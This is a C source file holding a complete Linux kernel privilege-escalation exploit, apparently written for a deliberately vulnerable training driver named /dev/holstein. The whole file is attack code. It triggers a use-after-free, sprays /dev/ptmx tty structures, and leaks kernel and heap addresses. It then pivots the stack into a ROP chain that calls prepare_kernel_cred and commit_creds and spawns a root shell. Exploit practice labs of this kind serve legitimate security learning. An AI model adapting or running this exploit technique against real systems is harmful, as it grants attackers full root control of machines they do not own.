#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define prepare_kernel_cred 0x072560
#define commit_creds 0x0723c0
#define pop_rdi 0x14078a
#define pop_rcx 0x0eb7e4
#define mov_rdi_rax_rep 0x638e9b
#define swapgs_restore_regs_and_return_to_usermode 0x800e26
#define rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp 0x14fbea

unsigned long user_cs, user_ss, user_rflags, user_rsp;
unsigned long image_base, heap_leak;
int spray[0x100];

static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory"
    );
}

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

static void exploit() {
    int fd1 = open("/dev/holstein", O_RDWR);
    int fd2 = open("/dev/holstein", O_RDWR);

    close(fd1);

    for(int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    }

    char buf[0x410];
    read(fd2, buf, 0x400);
    for(int i = 0; i <= 0x400; i += 8) {
        printf("[0x%04x] 0x%016lx\n", i, *(unsigned long *)&buf[i]);
    }

    image_base = *(unsigned long *)&buf[0x18] - 0xc39c60;
    heap_leak = *(unsigned long*)&buf[0x38] - 0x38;
    printf("[+] image_base = 0x%016lx\n", image_base);
    printf("[+] heap_leak = 0x%016lx\n", heap_leak);

    unsigned long *rop = (unsigned long *)&buf;
    *rop++ = image_base + pop_rdi;
    *rop++ = 0;
    *rop++ = image_base + prepare_kernel_cred;
    *rop++ = image_base + pop_rcx;
    *rop++ = 0;
    *rop++ = image_base + mov_rdi_rax_rep;
    *rop++ = image_base + commit_creds;
    *rop++ = image_base + swapgs_restore_regs_and_return_to_usermode;
    *rop++ = 0xdeadbeef; // rax
    *rop++ = 0xcafebabe; // [rdi]
    *rop++ = (unsigned long)&win; // [rdi + 0x10]
    *rop++ = user_cs; // [rdi + 0x18]
    *rop++ = user_rflags; // [rdi + 0x20]
    *rop++ = user_rsp; // [rdi + 0x28]
    *rop++ = user_ss; // [rdi + 0x30]

    *(unsigned long*)&buf[0x3f8] = image_base + rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp;

    write(fd2, buf, 0x400);

    int fd3 = open("/dev/holstein", O_RDWR);
    int fd4 = open("/dev/holstein", O_RDWR);
    close(fd3);

    for(int i = 50; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    }

    read(fd4, buf, 0x400);
    *(unsigned long*)&buf[0x18] = heap_leak + 0x3f8 - 12 * 8;
    write(fd4, buf, 0x20);

    for(int i = 50; i < 100; i++) {
        ioctl(spray[i], 0, heap_leak - 8);
    }
}

int main() {
    save_state();
    exploit();
    return 0;
}